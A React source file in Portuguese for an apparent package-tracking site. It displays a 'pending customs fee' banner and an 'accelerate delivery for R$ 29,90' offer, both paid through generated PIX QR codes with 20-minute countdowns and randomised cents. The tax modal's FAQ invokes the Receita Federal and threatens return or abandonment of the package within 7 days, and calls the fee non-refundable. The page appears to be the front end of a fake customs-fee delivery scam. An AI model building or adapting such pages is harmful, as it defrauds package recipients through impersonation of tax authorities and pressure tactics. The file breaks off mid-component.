import React, { useState, useEffect } from 'react';
import { Search, Package, MapPin, CheckCircle2, ArrowRight, Share2, Printer, Truck, CheckCircle, Calculator, X } from 'lucide-react';
import { useSearchParams } from 'react-router-dom';
import Header from '../components/Header';
import Footer from '../components/Footer';

const API_BASE = import.meta.env.VITE_API_URL || '';

const TrackingPage: React.FC = () => {
    const [searchParams] = useSearchParams();
    const [codigo, setCodigo] = useState('');
    const [trackingData, setTrackingData] = useState<any>(null);
    const [loading, setLoading] = useState(false);
    const [showExpressModal, setShowExpressModal] = useState(false);
    const [showTaxModal, setShowTaxModal] = useState(false);

    // PixGo Integration State
    const [pixLoading, setPixLoading] = useState(false);
    const [pixData, setPixData] = useState<any>(null);
    const [pixPaid, setPixPaid] = useState(false);

    // PixGo Tax Integration State
    const [taxPixLoading, setTaxPixLoading] = useState(false);
    const [taxPixData, setTaxPixData] = useState<any>(null);
    const [taxPixPaid, setTaxPixPaid] = useState(false);
    const [copied, setCopied] = useState(false);
    const [timeLeft, setTimeLeft] = useState<number | null>(null);

    // Config State
    const [useRandomCents, setUseRandomCents] = useState(true);

    useEffect(() => {
        fetch(`${API_BASE}/api/config/centavos`)
            .then(res => res.json())
            .then(data => setUseRandomCents(data.active))
            .catch(() => setUseRandomCents(true));
    }, []);

    useEffect(() => {
        let interval: any;
        if (pixData && !pixPaid) {
            interval = setInterval(async () => {
                try {
                    const res = await fetch(`${API_BASE}/api/pix/status/${pixData.payment_id}`);
                    const json = await res.json();
                    if (json && json.success && json.data?.status === 'completed') {
                        setPixPaid(true);
                        clearInterval(interval);
                    }
                } catch (e) { }
            }, 5000);
        }
        return () => clearInterval(interval);
    }, [pixData, pixPaid]);

    useEffect(() => {
        let interval: any;
        if (taxPixData && !taxPixPaid) {
            interval = setInterval(async () => {
                try {
                    const res = await fetch(`${API_BASE}/api/pix/status/${taxPixData.payment_id}`);
                    const json = await res.json();
                    if (json && json.success && json.data?.status === 'completed') {
                        setTaxPixPaid(true);
                        clearInterval(interval);
                    }
                } catch (e) { }
            }, 5000);
        }
        return () => clearInterval(interval);
    }, [taxPixData, taxPixPaid]);
    useEffect(() => {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('reveal-active');
                }
            });
        }, { threshold: 0.1 });

        const observeElements = () => {
            document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
        };

        observeElements();

        // Timer para garantir que novos elementos renderizados sejam observados
        const timeout = setTimeout(observeElements, 500);

        return () => {
            observer.disconnect();
            clearTimeout(timeout);
        };
    }, [trackingData]);

    useEffect(() => {
        let timer: any;
        if (timeLeft !== null && timeLeft > 0) {
            timer = setInterval(() => {
                setTimeLeft(prev => (prev !== null && prev > 0) ? prev - 1 : 0);
            }, 1000);
        } else if (timeLeft === 0) {
            setShowTaxModal(false);
            setShowExpressModal(false);
            setPixData(null);
            setTaxPixData(null);
            setTimeLeft(null);
            alert('O tempo para pagamento expirou. Gere um novo código se necessário.');
        }
        return () => clearInterval(timer);
    }, [timeLeft]);

    const formatTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
    };

    const fetchTrackingData = async (searchCode: string) => {
        if (!searchCode) return;

        setLoading(true);
        setTrackingData(null);

        try {
            const apiBase = import.meta.env.VITE_API_URL || '';
            const res = await fetch(`${apiBase}/api/rastreio-publico`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ codigo: searchCode.toUpperCase() }),
            });
            const data = await res.json();

            if (res.ok && data.success) {
                // Mapear os dados do banco para o formato da UI
                const statusMap: any = {
                    'postado': <CheckCircle2 size={20} />,
                    'transito': <Package size={20} />,
                    'distribuicao': <MapPin size={20} />,
                    'entrega': <Truck size={20} />,
                    'saiu': <Truck size={20} />,
                    'entregue': <CheckCircle2 size={20} />
                };

                const mappedData = {
                    codigo: data.codigo,
                    status: data.statusAtual || 'Pendente',
                    previsao: 'Em breve',
                    eventos: ([...data.etapas].reverse()).map((e: any, i: number) => {
                        // Tentar encontrar o melhor ícone baseado no título ou slug
                        let icon = <Package size={20} />;
                        const titleLower = (e.titulo || '').toLowerCase();
                        if (titleLower.includes('postado')) icon = statusMap['postado'];
                        else if (titleLower.includes('transito')) icon = statusMap['transito'];
                        else if (titleLower.includes('distribuição') || titleLower.includes('distribuicao') || titleLower.includes('centro')) icon = statusMap['distribuicao'];
                        else if (titleLower.includes('saiu') || titleLower.includes('rota')) icon = statusMap['entrega'];
                        else if (titleLower.includes('entregue')) icon = statusMap['entregue'];

                        return {
                            id: i,
                            status: e.titulo,
                            local: data.cidade,
                            data: new Date(e.data).toLocaleString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' }),
                            detalhes: e.subtitulo || e.titulo,
                            icon: icon
                        };
                    }),
                    etapaAtual: data.etapas.length,
                    taxa_valor: data.taxa_valor,
                    taxa_pix: data.taxa_pix
                };
                setTrackingData(mappedData);
            } else {
                alert(data.message || 'Código não encontrado ou erro na busca.');
            }
        } catch (err) {
            console.error(err);
            alert('Erro ao buscar rastreio.');
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        const codigoParam = searchParams.get('codigo');
        if (codigoParam) {
            const upCode = codigoParam.toUpperCase();
            setCodigo(upCode);
            fetchTrackingData(upCode);
        }
    }, [searchParams]);

    const handleSearch = async (e: React.FormEvent) => {
        e.preventDefault();
        fetchTrackingData(codigo);
    };

    return (
        <div className="tr-page">
            <style>{`
                .tr-page { background: #06060b; color: #fff; min-height: 100vh; position: relative; overflow-x: hidden; font-family: 'Outfit', sans-serif; }
                .tr-page * { box-sizing: border-box; }
                .bg-mesh {
                    position: fixed; inset: 0; pointer-events: none; z-index: 0;
                    background:
                        radial-gradient(ellipse 80% 50% at 50% -20%, rgba(99, 102, 241, 0.15), transparent),
                        radial-gradient(ellipse 60% 40% at 80% 50%, rgba(168, 85, 247, 0.08), transparent),
                        radial-gradient(ellipse 50% 30% at 20% 80%, rgba(6, 182, 212, 0.06), transparent);
                }
                
                .reveal { opacity: 0; transform: translateY(30px) scale(0.95); transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1); }
                .reveal-active { opacity: 1; transform: translateY(0) scale(1); }

                .search-hero { padding: 120px 24px 60px; text-align: center; max-width: 800px; margin: 0 auto; position: relative; z-index: 1; }

                .search-box-premium {
                    max-width: 600px; margin: 0 auto;
                    background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1);
                    backdrop-filter: blur(20px); border-radius: 32px; padding: 12px;
                    display: flex; gap: 12px; align-items: center;
                }
                .search-input-premium { flex: 1; background: transparent; border: none; color: white; padding: 10px 20px; font-size: 1.1rem; outline: none; }
                .btn-track { padding: 14px 32px; background: linear-gradient(135deg, #6366f1, #a855f7); border: none; border-radius: 22px; color: white; font-weight: 800; cursor: pointer; display: flex; align-items: center; gap: 10px; box-shadow: 0 8px 32px rgba(99, 102, 241, 0.4); white-space: nowrap; justify-content: center; }
                
                .tracking-container { max-width: 900px; margin: 0 auto 100px; padding: 0 24px; position: relative; z-index: 1; }
                .status-card { background: rgba(255,255,255,0.02); backdrop-filter: blur(32px); border: 1px solid rgba(255,255,255,0.08); border-radius: 40px; padding: 48px; margin-bottom: 40px; }
                .tl-item { display: flex; gap: 24px; margin-bottom: 32px; }
                .tl-point { width: 50px; height: 50px; border-radius: 16px; background: rgba(99, 102, 241, 0.1); display: flex; align-items: center; justify-content: center; color: #818cf8; flex-shrink: 0; position: relative; }
                .tl-line { position: absolute; top: 58px; left: 24px; width: 2px; height: calc(100% - 10px); background: rgba(255,255,255,0.05); }
                .tl-content { flex: 1; padding-bottom: 40px; }
                .tl-content h4 { font-size: 1.25rem; font-weight: 800; margin-bottom: 4px; }
                .tl-content p { color: rgba(255,255,255,0.4); line-height: 1.6; }
                
                .express-box { text-align: center; padding: 32px 0 0; margin-top: 32px; border-top: 2px dashed rgba(255,255,255,0.06); }
                .express-btn {
                    padding: 16px 40px; border: none; border-radius: 18px;
                    background: linear-gradient(135deg, #0096ff, #6366f1);
                    color: white; font-weight: 800; font-size: 1.05rem; cursor: pointer;
                    box-shadow: 0 8px 32px rgba(0, 150, 255, 0.3);
                    font-family: 'Outfit', sans-serif;
                    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
                }
                .express-btn:hover { transform: translateY(-3px); box-shadow: 0 16px 48px rgba(0, 150, 255, 0.5); }
                
                @media (max-width: 768px) { 
                    .search-hero { padding: 150px 20px 40px !important; }
                    .status-card { padding: 24px; } 
                    .search-box-premium { 
                        border-radius: 20px; flex-direction: column; padding: 20px; gap: 12px;
                        background: rgba(255,255,255,0.05);
                    } 
                    .search-input-premium { text-align: center; }
                    .btn-track { width: 100%; justify-content: center; padding: 16px; } 
                    .st-header { flex-direction: column !important; text-align: center; gap: 24px; }
                    .st-badges { justify-content: center; flex-wrap: wrap; }
                    .st-right { text-align: center !important; }
                    .st-code { font-size: 1.5rem !important; margin-top: 8px; }
                }

            `}</style>

            <div className="bg-mesh"></div>

            <Header />

            <section className="search-hero">
                <div className="reveal">
                    <h1 style={{ fontSize: 'clamp(2.5rem, 6vw, 4rem)', fontWeight: 900, marginBottom: '24px', letterSpacing: '-2px' }}>Onde está seu <span style={{ color: '#818cf8' }}>pacote?</span></h1>
                    <p style={{ color: 'rgba(255,255,255,0.4)', fontSize: '1.1rem', marginBottom: '48px' }}>Monitore sua entrega em tempo real com precisão de metros.</p>
                </div>

                <form onSubmit={handleSearch} className="search-box-premium reveal">
                    <Search size={24} color="#6366f1" />
                    <input type="text" className="search-input-premium" placeholder="Cole seu código de rastreio aqui..." value={codigo} onChange={e => setCodigo(e.target.value.toUpperCase())} maxLength={30} />
                    <button type="submit" className="btn-track" disabled={loading}>
                        {loading ? 'Processando...' : 'Localizar'} <ArrowRight size={20} />
                    </button>
                </form>
            </section>

            <div className="tracking-container">
                {trackingData ? (
                    <div>
                        <div className="status-card">
                            {trackingData.taxa_valor && (
                                <div style={{
                                    background: 'rgba(239, 68, 68, 0.1)',
                                    border: '1px solid rgba(239, 68, 68, 0.2)',
                                    borderRadius: '20px',
                                    padding: '20px',
                                    marginBottom: '32px',
                                    display: 'flex',
                                    alignItems: 'center',
                                    justifyContent: 'space-between',
                                    gap: '16px'
                                }}>
                                    <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                                        <div style={{ width: '40px', height: '40px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '10px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                                            <Calculator size={20} color="#ef4444" />
                                        </div>
                                        <div>
                                            <div style={{ color: '#ef4444', fontWeight: 800, fontSize: '0.9rem', textTransform: 'uppercase' }}>Taxa Pendente</div>
                                            <div style={{ color: 'rgba(255,255,255,0.6)', fontSize: '0.85rem' }}>Seu pedido aguarda o pagamento da taxa alfandegária.</div>
                                        </div>
                                    </div>
                                    <button
                                        onClick={() => setShowTaxModal(true)}
                                        style={{
                                            background: '#ef4444',
                                            color: '#fff',
                                            border: 'none',
                                            padding: '10px 20px',
                                            borderRadius: '12px',
                                            fontWeight: 800,
                                            fontSize: '0.9rem',
                                            cursor: 'pointer',
                                            boxShadow: '0 4px 12px rgba(239, 68, 68, 0.3)'
                                        }}
                                    >
                                        Pagar R$ {trackingData.taxa_valor}
                                    </button>
                                </div>
                            )}

                            <div className="st-header" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '40px' }}>
                                <div>
                                    <div className="st-badges" style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px' }}>
                                        <div style={{ display: 'inline-flex', padding: '6px 16px', background: 'rgba(52, 211, 153, 0.1)', border: '1px solid rgba(52, 211, 153, 0.2)', borderRadius: '100px', fontSize: '0.8rem', fontWeight: 800, color: '#34d399' }}>{trackingData.status}</div>
                                        {trackingData.taxa_valor && (
                                            <div style={{ display: 'inline-flex', padding: '6px 16px', background: 'rgba(239, 68, 68, 0.1)', border: '1px solid rgba(239, 68, 68, 0.2)', borderRadius: '100px', fontSize: '0.8rem', fontWeight: 800, color: '#ef4444' }}>TAXA PENDENTE</div>
                                        )}
                                    </div>
                                    <h2 className="st-code" style={{ fontSize: '1.8rem', fontWeight: 900 }}>{trackingData.codigo}</h2>
                                </div>
                                <div className="st-right" style={{ textAlign: 'right' }}>
                                    <p style={{ color: 'rgba(255,255,255,0.3)', fontSize: '0.8rem' }}>Previsão de Entrega</p>
                                    <p style={{ fontSize: '1.2rem', fontWeight: 800, color: '#818cf8' }}>{trackingData.previsao}</p>
                                </div>
                            </div>

                            <div style={{ display: 'flex', gap: '8px', marginBottom: '48px' }}>
                                {[1, 2, 3, 4].map(step => (
                                    <div key={step} style={{ flex: 1, height: '4px', background: step <= trackingData.etapaAtual ? '#818cf8' : 'rgba(255,255,255,0.05)', borderRadius: '2px', boxShadow: step === trackingData.etapaAtual ? '0 0 10px #818cf8' : 'none' }}></div>
                                ))}
                            </div>

                            <div className="timeline-list">
                                {trackingData.eventos.map((ev: any, i: number) => (
                                    <div key={i} className="tl-item">
                                        <div className="tl-point">
                                            {ev.icon}
                                            {i < trackingData.eventos.length - 1 && <div className="tl-line"></div>}
                                        </div>
                                        <div className="tl-content">
                                            <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                                                <h4>{ev.status}</h4>
                                                <span style={{ fontSize: '0.8rem', color: '#818cf8', fontWeight: 700 }}>{ev.data}</span>
                                            </div>
                                            <p>{ev.detalhes}</p>
                                            <p style={{ fontSize: '0.8rem', marginTop: '4px' }}>📍 {ev.local}</p>
                                        </div>
                                    </div>
                                ))}
                            </div>

                            <div className="express-box">
                                {trackingData.taxa_valor && (
                                    <button
                                        className="express-btn"
                                        style={{ background: 'linear-gradient(135deg, #ef4444, #dc2626)', marginBottom: '16px', display: 'block', width: '100%', boxShadow: '0 8px 32px rgba(239, 68, 68, 0.3)' }}
                                        onClick={() => setShowTaxModal(true)}
                                    >
                                        💰 Pagar Taxa de Importação (R$ {trackingData.taxa_valor})
                                    </button>
                                )}
                                <button className="express-btn" onClick={() => setShowExpressModal(true)}>⚡ Acelerar por R$ 29,90</button>
                                <p style={{ color: 'rgba(255,255,255,0.3)', fontSize: '0.9rem', marginTop: '12px' }}>Receba seu pacote prioritariamente em até 3 dias.</p>
                            </div>
                        </div>

                        <div style={{ display: 'flex', gap: '16px', justifyContent: 'center' }}>
                            <button className="nav-item" style={{ padding: '12px 24px', background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '16px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}><Share2 size={16} /> Compartilhar</button>
                            <button className="nav-item" style={{ padding: '12px 24px', background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '16px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}><Printer size={16} /> Imprimir</button>
                        </div>
                    </div>
                ) : (
                    <div style={{ textAlign: 'center', padding: '60px 0', opacity: 0.3 }} className="reveal">
                        <Package size={80} style={{ marginBottom: '24px' }} />
                        <p>Digite o seu código para ver a mágica acontecer.</p>
                    </div>
                )}
            </div>

            <Footer />

            {/* Modal Taxa */}
            {showTaxModal && trackingData?.taxa_valor && (
                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }}>
                    <div style={{
                        background: 'rgba(20, 20, 25, 0.95)',
                        border: '1px solid rgba(255,255,255,0.1)',
                        borderRadius: '32px',
                        width: '100%',
                        maxWidth: '440px',
                        maxHeight: '90vh',
                        padding: '40px',
                        boxShadow: '0 24px 80px rgba(0,0,0,0.5)',
                        animation: 'fadeIn 0.3s ease',
                        textAlign: 'center',
                        overflowY: 'auto',
                        position: 'relative'
                    }} onClick={e => e.stopPropagation()}>
                        <button
                            onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }}
                            style={{ position: 'absolute', top: '20px', right: '20px', background: 'rgba(255,255,255,0.05)', border: 'none', borderRadius: '50%', width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#888', cursor: 'pointer' }}
                        >
                            <X size={18} />
                        </button>
                        <div style={{ width: '80px', height: '80px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                            <Calculator size={40} color="#ef4444" />
                        </div>
                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif' }}>Pagar Taxa</h2>
                        <p style={{ color: 'rgba(255,255,255,0.45)', lineHeight: 1.6, marginBottom: '32px' }}>
                            Para liberar seu pacote do centro de fiscalização, realize o pagamento da taxa de importação de <strong>R$ {trackingData.taxa_valor}</strong>.
                        </p>

                        {!taxPixData && !taxPixLoading && !taxPixPaid && (
                            <button onClick={async () => {
                                setTaxPixLoading(true);
                                try {
                                    const taxAmount = Number(trackingData.taxa_valor.toString().replace(',', '.'));
                                    const cents = useRandomCents ? Math.floor(Math.random() * 99) : 90;
                                    const finalAmount = Math.floor(taxAmount) + (cents / 100);

                                    const res = await fetch(`${API_BASE}/api/pix/create`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            amount: finalAmount,
                                            description: `Taxa de Importação - ${trackingData.codigo}`
                                        })
                                    });
                                    const data = await res.json();
                                    if (data && data.success) {
                                        setTaxPixData(data.data);
                                        setTimeLeft(20 * 60); // 20 minutos
                                    } else {
                                        alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente.'));
                                    }
                                } catch (e) {
                                    alert('Erro de conexão ao gerar o PIX.');
                                } finally {
                                    setTaxPixLoading(false);
                                }
                            }} style={{ width: '100%', padding: '16px', background: 'linear-gradient(135deg, #ef4444, #991b1b)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 800, fontSize: '1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(239, 68, 68, 0.3)' }}>
                                Gerar PIX de R$ {trackingData.taxa_valor}
                            </button>
                        )}

                        {taxPixLoading && (
                            <div style={{ color: '#ef4444', fontWeight: 'bold' }}>⏳ Gerando QR Code PIX, aguarde...</div>
                        )}

                        {taxPixData && !taxPixPaid && (
                            <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <div style={{ fontSize: '0.8rem', color: '#ef4444', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pix Copia e Cola</div>
                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#fff', marginBottom: '16px' }}>
                                    R$ {taxPixData.amount ? taxPixData.amount.toFixed(2).replace('.', ',') : trackingData.taxa_valor}
                                </div>
                                <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
                                    <img src={taxPixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
                                </div>
                                <div style={{ background: 'rgba(0,0,0,0.5)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: 'rgba(255,255,255,0.7)', marginBottom: '10px', userSelect: 'all' }}>
                                    {taxPixData.qr_code}
                                </div>
                                {timeLeft !== null && (
                                    <div style={{ marginBottom: '16px', color: '#ef4444', fontWeight: 800, fontSize: '1rem', background: 'rgba(239,68,68,0.1)', padding: '8px', borderRadius: '10px' }}>
                                        🕒 Expira em: {formatTime(timeLeft)}
                                    </div>
                                )}
                                <p style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.35)', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                <button
                                    onClick={() => {
                                        navigator.clipboard.writeText(taxPixData.qr_code);
                                        setCopied(true);
                                        setTimeout(() => setCopied(false), 2000);
                                    }}
                                    style={{
                                        padding: '12px 24px',
                                        background: copied ? '#10b981' : '#ef4444',
                                        border: 'none',
                                        borderRadius: '12px',
                                        color: 'white',
                                        cursor: 'pointer',
                                        fontSize: '0.95rem',
                                        fontWeight: 800,
                                        transition: 'all 0.3s ease',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        gap: '8px',
                                        margin: '0 auto',
                                        width: '100%'
                                    }}
                                >
                                    {copied ? (
                                        <><CheckCircle size={18} /> Copiado com sucesso!</>
                                    ) : (
                                        'Copiar Código PIX'
                                    )}
                                </button>
                                <div style={{ marginTop: '20px', color: '#10b981', fontWeight: 'bold', animation: 'pulse 2s infinite' }}>⏳ Aguardando Pagamento...</div>
                            </div>
                        )}

                        {taxPixPaid && (
                            <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <CheckCircle size={48} color="#10b981" style={{ margin: '0 auto 16px' }} />
                                <div style={{ fontSize: '1.2rem', color: '#10b981', fontWeight: 800 }}>Pagamento Confirmado!</div>
                                <p style={{ fontSize: '0.9rem', color: 'rgba(255,255,255,0.7)', marginTop: '8px' }}>Sua taxa foi paga com sucesso. O pacote será liberado em breve.</p>
                            </div>
                        )}

                        {/* FAQ SECTION */}
                        <div style={{ textAlign: 'left', marginTop: '40px', borderTop: '1px solid rgba(255,255,255,0.1)', paddingTop: '32px' }}>
                            <h3 style={{ fontSize: '1.1rem', fontWeight: 800, marginBottom: '20px', color: '#fff', display: 'flex', alignItems: 'center', gap: '10px' }}>
                                <Package size={20} color="#ef4444" /> Informações Importantes
                            </h3>

                            <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                                <FaqItem
                                    q="Por que fui taxado?"
                                    a="Todas as compras internacionais estão sujeitas à fiscalização da Receita Federal e podem ser tributadas conforme a legislação vigente de importação."
                                />
                                <FaqItem
                                    q="O que acontece se eu não pagar?"
                                    a="Caso o pagamento não seja identificado em até 7 dias, o objeto pode ser devolvido ao país de origem ou declarado como abandonado, perdendo o direito ao reembolso."
                                />
                                <FaqItem
                                    q="Qual o prazo para liberação?"
                                    a="Após a confirmação do pagamento, a Receita Federal geralmente libera o pacote para entrega em um prazo de 3 a 5 dias úteis."
                                />
                                <FaqItem
                                    q="O valor é reembolsável?"
                                    a="Não. As taxas alfandegárias são tributos obrigatórios e não passíveis de devolução após o processamento pela fiscalização."
                                />
                            </div>
                        </div>

                        <button onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '32px', cursor: 'pointer', fontWeight: 600, fontSize: '0.9rem', textDecoration: 'underline' }}>{taxPixPaid ? 'Fechar' : 'Voltar para o rastreio'}</button>
                    </div>
                </div>
            )}

            {/* Modal Acelerar */}
            {showExpressModal && (
                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); setTimeLeft(null); }}>
                    <div style={{
                        background: 'rgba(20, 20, 25, 0.95)',
                        border: '1px solid rgba(255,255,255,0.1)',
                        borderRadius: '32px',
                        width: '100%',
                        maxWidth: '440px',
                        maxHeight: '90vh',
                        padding: '40px',
                        boxShadow: '0 24px 80px rgba(0,0,0,0.5)',
                        animation: 'fadeIn 0.3s ease',
                        textAlign: 'center',
                        overflowY: 'auto',
                        position: 'relative'
                    }} onClick={e => e.stopPropagation()}>
                        <button
                            onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); setTimeLeft(null); }}
                            style={{ position: 'absolute', top: '20px', right: '20px', background: 'rgba(255,255,255,0.05)', border: 'none', borderRadius: '50%', width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#888', cursor: 'pointer' }}
                        >
                            <X size={18} />
                        </button>
                        <div style={{ width: '80px', height: '80px', background: 'rgba(99, 102, 241, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                            <Truck size={40} color="#6366f1" />
                        </div>
                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif' }}>Acelerar Entrega</h2>
                        <p style={{ color: 'rgba(255,255,255,0.45)', lineHeight: 1.6, marginBottom: '32px' }}>
                            Ao acelerar, seu pacote ganha prioridade máxima em nossa malha e será entregue em até <strong>3 dias úteis</strong>.
                        </p>

                        {!pixData && !pixLoading && (
                            <button onClick={async () => {
                                setPixLoading(true);
                                try {
                                    const cents = useRandomCents ? Math.floor(Math.random() * 99) : 90;
                                    const finalAmount = Number(`29.${cents < 10 ? '0' + cents : cents}`);

                                    const res = await fetch(`${API_BASE}/api/pix/create`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ amount: finalAmount, description: 'Acelerar Entrega Rastreamento' })
                                    });
                                    const data = await res.json();
                                    if (data && data.success) {
                                        setPixData(data.data);
                                        setTimeLeft(20 * 60); // 20 minutos
                                    } else {
                                        alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente.'));
                                    }
                                } catch (e) {
                                    alert('Erro de conexão ao gerar o PIX.');
                                } finally {
                                    setPixLoading(false);
                                }
                            }} style={{ width: '100%', padding: '16px', background: 'linear-gradient(135deg, #6366f1, #a855f7)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 800, fontSize: '1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(99, 102, 241, 0.3)' }}>
                                Pagar R$ 29,90 via PIX Agora
                            </button>
                        )}
                        {pixLoading && (
                            <div style={{ color: '#818cf8', fontWeight: 'bold' }}>⏳ Gerando QR Code PIX, aguarde...</div>
                        )}

                        {pixData && !pixPaid && (
                            <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <div style={{ fontSize: '0.8rem', color: '#818cf8', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pague via PIX</div>
                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#fff', marginBottom: '16px' }}>
                                    R$ {pixData.amount ? pixData.amount.toFixed(2).replace('.', ',') : '29,90'}
                                </div>
                                <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
                                    <img src={pixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
                                </div>
                                <div style={{ background: 'rgba(0,0,0,0.5)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: 'rgba(255,255,255,0.7)', marginBottom: '10px', userSelect: 'all' }}>
                                    {pixData.qr_code}
                                </div>
                                {timeLeft !== null && (
                                    <div style={{ marginBottom: '16px', color: '#818cf8', fontWeight: 800, fontSize: '1rem', background: 'rgba(129,140,248,0.1)', padding: '8px', borderRadius: '10px' }}>
                                        🕒 Expira em: {formatTime(timeLeft)}
                                    </div>
                                )}
                                <p style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.35)', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                <button
                                    onClick={() => {
                                        navigator.clipboard.writeText(pixData.qr_code);
                                        setCopied(true);
                                        setTimeout(() => setCopied(false), 2000);
                                    }}
                                    style={{
                                        padding: '12px 24px',
                                        background: copied ? '#10b981' : '#4f46e5',
                                        border: 'none',
                                        borderRadius: '12px',
                                        color: 'white',
                                        cursor: 'pointer',
                                        fontSize: '0.95rem',
                                        fontWeight: 800,
                                        transition: 'all 0.3s ease',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        gap: '8px',
                                        margin: '0 auto',
                                        width: '100%'
                                    }}
                                >
                                    {copied ? (
                                        <><CheckCircle size={18} /> Copiado com sucesso!</>
                                    ) : (
                                        'Copiar Código PIX'
                                    )}
                                </button>
                                <div style={{ marginTop: '20px', color: '#10b981', fontWeight: 'bold', animation: 'pulse 2s infinite' }}>⏳ Aguardando Pagamento...</div>
                            </div>
                        )}

                        {pixPaid && (
                            <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <CheckCircle size={48} color="#10b981" style={{ margin: '0 auto 16px' }} />
                                <div style={{ fontSize: '1.2rem', color: '#10b981', fontWeight: 800 }}>Pagamento Confirmado!</div>
                                <p style={{ fontSize: '0.9rem', color: 'rgba(255,255,255,0.7)', marginTop: '8px' }}>Seu processo de aceleração foi ativado. Você receberá atualizações em breve.</p>
                            </div>
                        )}

                        <button onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); setTimeLeft(null); }} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>{pixPaid ? 'Fechar' : 'Cancelar'}</button>
                    </div>
                </div>
            )}
        </div>
    );
};

const FaqItem: React.FC<{ q: string; a: string }> = ({ q, a }) => (
    <div>
        <div style={{ color: '#ef4444', fontWeight: 800, fontSize: '0.85rem', marginBottom: '4px', textTransform: 'uppercase' }}>{q}</div>
